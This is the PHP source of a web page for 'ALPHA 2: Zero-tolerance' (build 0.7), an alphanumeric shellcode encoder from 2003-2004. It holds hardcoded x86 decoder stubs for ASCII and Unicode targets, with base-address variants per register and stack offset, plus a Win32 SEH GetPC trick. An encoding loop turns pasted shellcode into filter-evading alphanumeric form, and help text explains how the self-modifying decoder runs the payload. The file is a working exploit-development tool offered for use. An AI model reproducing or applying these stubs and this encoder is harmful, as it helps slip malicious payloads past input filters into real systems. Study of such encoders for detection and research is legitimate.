<?php
  require('PHPkernel.php');

  // #defines

  $mixedcase_w32sehgetpc          = "VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089";
  $uppercase_w32sehgetpc          = "VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816";
  $ascii_mixedcase_decoder_body   = "jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI";
  $ascii_uppercase_decoder_body   = "VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI";
  $unicode_mixedcase_decoder_body = "jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYAZBABABABABkMAGB9u4JB";
  $unicode_uppercase_decoder_body = "QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB";

  $options = array();
  $options["ascii_mixedcase"] = array();
  $options["ascii_uppercasecase"] = array();
  $options["ascii_mixedcase_nocompress"] = array();
  $options["ascii_uppercasecase_nocompress"] = array();
  $options["unicode_mixedcase"] = array();
  $options["unicode_uppercasecase"] = array();
  $options["unicode_mixedcase_nocompress"] = array();
  $options["unicode_uppercasecase_nocompress"] = array();
  $info = array();

  $options["ascii_mixedcase"]["nops"]                = "IIIIIIIIIIIIIIIIII7".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["eax"]                 = "PYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["ecx"]                 = "IIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["edx"]                 = "JJJJJJJJJJJJJJJJJ7RY".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["ebx"]                 = "SYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["esp"]                 = "TYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["ebp"]                 = "UYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["esi"]                 = "VYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["edi"]                 = "WYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp-10]"]            = "LLLLLLLLLLLLLLLLYIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp-C]"]             = "LLLLLLLLLLLLYIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp-8]"]             = "LLLLLLLLYIIIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp-4]"]             = "LLLL7YIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp]"]               = "YIIIIIIIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+4]"]             = "YYIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+8]"]             = "YYYIIIIIIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+C]"]             = "YYYYIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+10]"]            = "YYYYYIIIIIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+14]"]            = "YYYYYYIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+18]"]            = "YYYYYYYIIIIIIIIIIIIIIQZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["[esp+1C]"]            = "YYYYYYYYIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase"]["seh"]                 = $mixedcase_w32sehgetpc."IIIIIIIIIIIIIIIII7QZ".$ascii_mixedcase_decoder_body;
  $info["ascii_mixedcase_seh"] =
    "<B>Mixedcase Win32 SEH GetPC</B> creates and hooks a new SEH handler on ".
    "the stack and then causes an exception, passing execution to the new ".
    "SEH. Through this it can determine where the exception took place and ".
    "where your shellcode is located in memory.";
  $options["ascii_mixedcase_nocompress"]["nops"]     = "7777777777777777777777777777777777777".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["eax"]      = "PY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["ecx"]      = "77777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["edx"]      = "77777777777777777777777777777777777RY".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["ebx"]      = "SY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["esp"]      = "TY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["ebp"]      = "UY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["esi"]      = "VY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["edi"]      = "WY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp-10]"] = "LLLLLLLLLLLLLLLLY777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp-C]"]  = "LLLLLLLLLLLLY7777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp-8]"]  = "LLLLLLLLY77777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp-4]"]  = "LLLL7Y77777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp]"]    = "Y7777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+4]"]  = "YY777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+8]"]  = "YYY77777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+C]"]  = "YYYY7777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+10]"] = "YYYYY777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+14]"] = "YYYYYY77777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+18]"] = "YYYYYYY7777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["[esp+1C]"] = "YYYYYYYY777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $options["ascii_mixedcase_nocompress"]["seh"]      = $mixedcase_w32sehgetpc."77777777777777777777777777777777777QZ".$ascii_mixedcase_decoder_body;
  $info["ascii_mixedcase_nocompress_seh"] =
    "<B>Mixedcase Win32 SEH GetPC</B> creates and hooks a new SEH handler on ".
    "the stack and then causes an exception, passing execution to the new ".
    "SEH. Through this it can determine where the exception took place and ".
    "where your shellcode is located in memory.";
  $options["ascii_uppercase"]["nops"]                = "IIIIIIIIIIII".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["eax"]                 = "PYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["ecx"]                 = "IIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["edx"]                 = "JJJJJJJJJJJRY".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["ebx"]                 = "SYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["esp"]                 = "TYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["ebp"]                 = "UYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["esi"]                 = "VYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["edi"]                 = "WYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp-10]"]            = "LLLLLLLLLLLLLLLLYII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp-C]"]             = "LLLLLLLLLLLLYIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp-8]"]             = "LLLLLLLLYIIIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp-4]"]             = "LLLL7YIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp]"]               = "YIIIIIIIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+4]"]             = "YYIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+8]"]             = "YYYIIIIIIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+C]"]             = "YYYYIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+10]"]            = "YYYYYIIIIIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+14]"]            = "YYYYYYIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+18]"]            = "YYYYYYYIIIIIII7QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["[esp+1C]"]            = "YYYYYYYYIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase"]["seh"]                 = $uppercase_w32sehgetpc."IIIIIIIIIIIQZ".$ascii_uppercase_decoder_body;
  $info["ascii_uppercase_seh"] =
    "<B>Uppercase Win32 SEH GetPC</B> creates a new SEH handler on the stack ".
    "and replaces the last hooked SEH with it. It then causes an exception, ".
    "passing execution to the new SEH. Through this it can determine where ".
    "the exception took place and where your shellcode is located in memory. ".
    "Hooking the SEH will not work if the program uses a lot of stack. The ".
    "code will also not work if any of the other SEH handlers catch the write ".
    "exception first.";
  $options["ascii_uppercase_nocompress"]["nops"]     = "777777777777777777777777".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["eax"]      = "PY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["ecx"]      = "7777777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["edx"]      = "7777777777777777777777RY".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["ebx"]      = "SY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["esp"]      = "TY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["ebp"]      = "UY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["esi"]      = "VY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["edi"]      = "WY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp-10]"] = "LLLLLLLLLLLLLLLLY77777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp-C]"]  = "LLLLLLLLLLLLY777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp-8]"]  = "LLLLLLLLY7777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp-4]"]  = "LLLL7Y7777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp]"]    = "Y777777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+4]"]  = "YY77777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+8]"]  = "YYY7777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+C]"]  = "YYYY777777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+10]"] = "YYYYY77777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+14]"] = "YYYYYY7777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+18]"] = "YYYYYYY777777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["[esp+1C]"] = "YYYYYYYY77777777777777QZ".$ascii_uppercase_decoder_body;
  $options["ascii_uppercase_nocompress"]["seh"]      = $uppercase_w32sehgetpc."7777777777777777777777QZ".$ascii_uppercase_decoder_body;
  $info["ascii_uppercase_nocompress_seh"] =
    "<B>Uppercase Win32 SEH GetPC</B> creates a new SEH handler on the stack ".
    "and replaces the last hooked SEH with it. It then causes an exception, ".
    "passing execution to the new SEH. Through this it can determine where ".
    "the exception took place and where your shellcode is located in memory. ".
    "Hooking the SEH will not work if the program uses a lot of stack. The ".
    "code will also not work if any of the other SEH handlers catch the write ".
    "exception first.";
  $options["unicode_mixedcase"]["nops"]              = "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["eax"]               = "PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["ecx"]               = "IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["edx"]               = "RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["ebx"]               = "SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["esp"]               = "TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $info["unicode_mixedcase_esp"] =
    "Second instruction overwrites the byte at [EBP] with the contents of ".
    "register DL, make sure this doesn't cause an exception or overwrites ".
    "your code";
  $options["unicode_mixedcase"]["ebp"]               = "UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["esi"]               = "VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["edi"]               = "WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["[esp]"]             = "YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase"]["[esp+4]"]           = "YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["nops"]   = "444444444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["eax"]    = "PPYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["ecx"]    = "444444444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["edx"]    = "RRYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["ebx"]    = "SSYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["esp"]    = "TUYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $info["unicode_mixedcase_nocompress_esp"] =
    "Second instruction overwrites the byte at [EBP] with the contents of ".
    "register DL, make sure this doesn't cause an exception or overwrites ".
    "your code";
  $options["unicode_mixedcase_nocompress"]["ebp"]    = "UUYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["esi"]    = "VVYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["edi"]    = "WWYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["[esp]"]  = "YA4444444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_mixedcase_nocompress"]["[esp+4]"]= "YUYA44444444444444444444444444444444444".$unicode_mixedcase_decoder_body;
  $options["unicode_uppercase"]["nops"]              = "IAIAIAIA4444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["eax"]               = "PPYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["ecx"]               = "IAIAIAIA4444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["edx"]               = "RRYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["ebx"]               = "SSYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["esp"]               = "TUYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $info["unicode_uppercase_esp"] =
    "Second instruction overwrites the byte at [EBP] with the contents of ".
    "register DL, make sure this doesn't cause an exception or overwrites ".
    "your code";
  $options["unicode_uppercase"]["ebp"]               = "UUYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["esi"]               = "VVYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["edi"]               = "WWYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["[esp]"]             = "YAIAIAIAIA44".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase"]["[esp+4]"]           = "YUYAIAIAIAIA".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["nops"]   = "44444444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["eax"]    = "PPYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["ecx"]    = "44444444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["edx"]    = "RRYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["ebx"]    = "SSYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["esp"]    = "TUYA4444444444".$unicode_uppercase_decoder_body;
  $info["unicode_uppercase_nocompress_esp"] =
    "Second instruction overwrites the byte at [EBP] with the contents of ".
    "register DL, make sure this doesn't cause an exception or overwrites ".
    "your code";
  $options["unicode_uppercase_nocompress"]["ebp"]    = "UUYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["esi"]    = "VVYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["edi"]    = "WWYA4444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["[esp]"]  = "YA444444444444".$unicode_uppercase_decoder_body;
  $options["unicode_uppercase_nocompress"]["[esp+4]"]= "YUYA4444444444".$unicode_uppercase_decoder_body;

  // Handle get, post and session variables
  // button supplies an action to take:
  // ok = return to main screen
  // encode = encode shellcode and show it.
  // help = show help information.
  $button = get_post_var("button", false);

  if (start_session()) $button = "HELP";

  // Here are some flags that can be set or unset using the url, their status
  // is stored in the session.
  $unicode = get_get_var("unicode", get_session_var("unicode", 0));
  set_session_var("unicode", $unicode==1);
  $uppercase = get_get_var("uppercase", get_session_var("uppercase", 0));
  set_session_var("uppercase", $uppercase==1);
  $nocompress = get_get_var("nocompress", get_session_var("nocompress", 0));
  set_session_var("nocompress", $nocompress==1);

  // source can also be set using the url but has a more complicated sanity
  // check. Other then that it's the same as above.
  $source = get_get_var("source", get_session_var("source", "nops"));

  $decoder_id = ($unicode ? "unicode" : "ascii" )."_".
                ($uppercase ? "upper" : "mixed" )."case".
                ($nocompress ? "_nocompress" : "");
  if (!$options[$decoder_id][$source])
    foreach ($options[$decoder_id] as $key => $value) {
      $source = $key;
      break;
    }
  set_session_var("source", $source);

  // shellcode cannot be set using the url... it's set using the POST form.
  // The information is also contained in the session.
  $shellcode = get_post_var("shellcode", get_session_var("shellcode", ""));
  set_session_var("shellcode", $shellcode);


?><HTML>
  <HEAD>
    <TITLE>ALPHA 2: Zero-tolerance. (build 0.7-php)</TITLE>
    <LINK rel="stylesheet" type="text/css" href="stylesheet.css">
  </HEAD>
  <BODY>
   <B>SkyLined</B>: The homepage for absolutely nothing!<BR>
    <HR>
    <PRE>
    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. (build 0.7-php)
   SS"  YSP"  SY"  ,SY
  iS'   dY       ,sS"   Alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   &lt;<A href="mailto:skylined@edup.tudelft.nl">skylined@edup.tudelft.nl</A>&gt;</PRE>
    <HR>
    <BR>
    <FORM method="post" id="myform" enctype="multipart/form-data">
<?php if ($button == "HELP") { ?>
      <B>ALPHA 2: Zero-tolerance</B> encodes IA-32 (x86) based shellcode to
      contain only alphanumeric characters (0-9 and A-Z). The result is a fully
      working version of the origional shellcode which consists of a decoder
      and the encoded origional shellcode.<BR>
      ALPHA 2 can encode your shellcode to
      <A href="http://www.phrack.org/show.php?p=57&a=15"> plain ASCII
      shellcodes</A> and <A href="http://www.phrack.org/show.php?p=61&a=11">
      UNICODE-proof shellcodes</A> using mixed-case or uppercase only
      characters.<BR>
      <BR>
      <B>The decoder</B> will changes it's own code to escape the limitations
      of alphanumeric code. It creates a decoder loop that will decode the
      origional shellcode from the encoded data. It overwrites the encoded data
      with the decoded shellcode and transfers execution to it when done.<BR>
      To do this, it needs read, write and execute permission on the memory
      it's running in and it needs to know it's location in memory (it's
      baseaddress). You will need to provide a source for the baseaddress, which
      can be any of the following, depending on the other encoding options:<BR>
      Registers: eax, ebx, ecx, edx, esi, edi, esp and ebp.<BR>
      Stack locations: [esp-n], [esp], [esp+n].<BR>
      Win32 SEH GetPC code (NT/2K/XP only): seh.<BR>
      The "nops" baseaddress option is added for use with your own baseaddress
      calculations. The code that normally moves the baseaddress in the correct
      register has been replaced with nops so you can replace it with your own.
      <BR>
      <BR>
      <B>Header compression</B> reduces the size of the decoder. The first few
      bytes are mostly there to fill up space and the number required can be
      reduced with specific instructions. You'll normally want this option
      on unless you need to overwrite this space with your own code (eg. in
      combination with "nops" to perform baseaddress calculation).<BR>
      <BR>
      <B>Win32 SEH GetPC</B> creates an SEH handler on the stack and hooks
      it into the SEH chain. It then causes an exception, passing execution
      to this new SEH. This SEH can determine the location where the exception
      took place and calculate the baseaddress. It then transfers execution
      back to the code after the instruction that caused the exception. This
      trick requires an executable stack. The mixedcase version should work
      100% of the time, where as the uppercase version might not work if the
      program uses a lot of stack or if one of the other exception handlers
      in the chain handles the write exceptions.<BR>
      <BR>
      <BR>
      <INPUT class="button" type="submit" name="button" value="OK"><BR>
<?php } else if ($button == "ENCODE" && !$shellcode) { ?>
      <B>Please supply a shellcode, n00b!</B><BR>
      <INPUT class="button" type="submit" name="button" value="OK"><BR>
<?php } else if ($button == "ENCODE" && !$options[$decoder_id][$source]) { ?>
      <B>The combination of option not you chose is not available !?</B><BR>
      <INPUT class="button" type="submit" name="button" value="OK"><BR>
<?php } else if ($button == "ENCODE") {
    $valid_chars = "0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ".
       ($uppercase ? "" : "abcdefghijklmnopqrstuvwxyz");
    $result = $options[$decoder_id][$source];

    // read, encode and output shellcode
    for ($i=0; $i < strlen($shellcode); $i++) {
      $input = ord($shellcode{$i});
      // encoding AB -> CD EF or CD 00 EF 00
      $A = ($input & 0xf0) >> 4;
      $B = ($input & 0x0f);

      $F = $B;
      // E is arbitrary as long as EF is a valid character
      $x = rand(0, strlen($valid_chars));
      while ((ord($valid_chars{$x}) & 0x0f) != $F) {$x = ++$x % strlen($valid_chars); }
      $E = ord($valid_chars{$x}) >> 4;
      // normal code uses xor, unicode-proof uses ADD.
      // AB ->
      $D =  $unicode ? ($A-$E) & 0x0f : ($A^$E);
      // C is arbitrary as long as CD is a valid character
      $x = rand(0, strlen($valid_chars));
      while ((ord($valid_chars{$x}) & 0x0f) != $D) {$x = ++$x % strlen($valid_chars); }
      $C = ord($valid_chars{$x}) >> 4;
      $result .= chr(($C<<4)+$D).chr(($E<<4)+$F);
    }
    $result .= "A";
    echo "Decoder length: ".strlen($options[$decoder_id][$source])."<BR>\n".
         "Origional shellcode length: ".strlen($shellcode)."<BR>\n".
         "Encoded shellcode length: ".strlen($result).
         " (".round(100*strlen($result)/strlen($shellcode), 2)."%)<BR>\n".
         "Options: ".($unicode ? "UNICODE" : "ASCII").", ".
                     ($uppercase ? "UPPERCASE" : "MixedCase").", ".
                     "header compression ".($nocompress ? "OFF" : "ON").
                     ", using ".$source." for baseaddress.<BR>\n";
    ?><BR>
      Result:<BR>
      <TEXTAREA style="width:100%; height: 15em;"><?php echo htmlspecialchars($result); ?></TEXTAREA><BR>
      <BR>
      <INPUT class="button" type="submit" name="button" value="OK"><BR>
<?php } else { ?>
      Target character set : <?php
        echo "<A href=\"?unicode=".($unicode ? "0" : "1").
             "\">".($unicode ? "UNICODE" : "ASCII")."</A>.";
      ?><BR>
      Capitalization : <?php
        echo "<A href=\"?uppercase=".($uppercase ? "0" : "1").
             "\">".($uppercase ? "UPPERCASE" : "MixedCase")."</A>.";
      ?><BR>
      Header compression : <?php
        echo "<A href=\"?nocompress=".($nocompress ? "0" : "1").
             "\">".($nocompress ? "OFF" : "ON")."</A>.";
      ?><BR>
      Baseaddress source : <?php
        echo $source;
      ?><BR>
<?php
  foreach ($options[$decoder_id] as $key => $value)
    if ($key != $source)
      echo "      <A href=\"?source=".rawurlencode($key).
      "\">".htmlspecialchars($key)."</A>\n";
    echo  "      <BR>";
  if (isset($info[$decoder_id."_".$source]))
    echo  "      <BR>".
          "      Notes on decoder : ".
         $info[$decoder_id."_".$source]."<BR>\n";
?>      <BR>
     Paste shellcode here:<BR>
      <TEXTAREA style="width:100%; height: 15em;" name="shellcode"><?php if ($shellcode) echo htmlspecialchars($shellcode); ?></TEXTAREA><BR>
      <BR>
      <INPUT class="button" type="submit" name="button" value="ENCODE">
      <INPUT class="button" type="submit" name="button" value="HELP"><BR>
<?php } ?>
    </FORM>
    <BR>
    <HR>
    Acknowledgements:<BR>
    <A href="http://www.phrack.org/show.php?p=57&a=15">
      Thanks to rix for his phrack article on aphanumeric shellcode.</A><BR>
    <A href="http://www.phrack.org/show.php?p=61&a=11">
      Thanks to obscou for his phrack article on unicode-proof shellcode.</A><BR>
    Thanks to Costin Ionescu for the idea behind w32 SEH GetPC code.<BR>
    Thanks to everybody on 0dd for help, information and feedback.<BR>
  </BODY>
</HTML>
